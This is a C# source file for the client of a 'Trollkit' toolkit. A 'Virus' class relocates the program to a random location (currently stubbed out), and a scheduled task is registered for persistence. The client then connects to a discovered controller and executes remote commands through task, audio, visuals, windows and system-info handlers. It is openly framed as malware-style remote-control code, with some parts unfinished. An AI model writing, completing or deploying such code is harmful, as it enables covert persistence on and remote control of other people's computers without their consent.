using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading.Tasks;
using Trollkit_Client.Modules;
using Trollkit_Client.Modules.CommandHandlers;
using Trollkit_Library;
using Trollkit_Library.ClientModules;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client
{
	class Program
	{
		private ClientDiscovery discover;
		private ClientReceiver receiver;
		public Dictionary<string,ICommandHandler> handlers;

		static void Main(string[] args)
		{
			if (args.Length > 0)
				if(args[0] == "move-completed")
				{
					BConsole.WriteLine("Application has been moved to a different location...");
					var program = new Program();
					var addresses = program.discover.GetIpAddresses();
					string ip = program.discover.GetRemoteServerIp(addresses);
					bool crashed = false;
					Task.Run(() => {
						program.receiver.ConnectAndReceive(ip);
						crashed = true;
					});

					while(!crashed)
						Console.ReadLine();

					return;
				}


			Virus virus = new Virus();
			string randomLocation = virus.FindRandomFileLocation();
			//TODO: make sure the appliction is restarted with the right parameter.
			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
			BConsole.WriteLine($"New File location: {newFileLocation}");
			new TaskSchedulerHelper().CreateTask(newFileLocation);

			//TODO: after above is fixed remove this so the application closes itself
			Console.Read();
		}

		public Program()
		{
			discover = new ClientDiscovery("gang?", "Dopple gang");
			receiver = new ClientReceiver();
			receiver.OnDataReceived += Receiver_OnDataReceived;
			handlers = new Dictionary<string,ICommandHandler>();
			handlers.Add("Task", new TaskHandler());
			handlers.Add("Audio", new AudioHandler());
			handlers.Add("Visuals", new VisualsHandler());
			handlers.Add("Windows", new WindowsHandler());
			handlers.Add("SystemInfo", new SystemInfoHandler());
		}

		private void Receiver_OnDataReceived(Socket s, TransferCommandObject Object)
		{
			try
			{
				if (handlers.ContainsKey(Object.Handler))
				{
					if (handlers[Object.Handler].HandleCommand(s, Object))
					{
						BConsole.WriteLine($"Command '{Object.Command}' executed successfully", ConsoleColor.Green);
					}
					else
					{
						BConsole.WriteLine($"Command '{Object.Command}' could not be executed", ConsoleColor.Red);
					}
				}
				else
				{
					BConsole.WriteLine($"Unkown Handler '{Object.Handler}', please refer to the README.md", ConsoleColor.Red);
				}
			}
			catch(Exception e)
			{
				BConsole.WriteLine("Handler error: " + e.Message, ConsoleColor.Red);
			}
		}
	}
}
